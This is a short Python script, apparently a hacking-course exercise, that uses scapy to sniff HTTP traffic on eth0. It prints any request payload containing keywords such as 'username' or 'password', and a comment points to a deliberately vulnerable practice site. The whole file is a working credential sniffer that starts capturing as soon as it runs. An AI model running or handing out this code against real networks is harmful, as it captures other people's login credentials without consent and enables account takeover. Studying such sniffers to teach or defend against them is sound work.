import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface,store=False,prn=process_sniffed_packet) #can usef filter argument to filter specific ports

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            # print(packet.show())
            load = str(packet[scapy.Raw].load)
           
            keywords = ["username","name","uname","password","pass"] 
    
            for keyword in keywords:

                if keyword in load:
                    print(load)
                    break
                



sniff("eth0")










# http://testphp.vulnweb.com/login.php
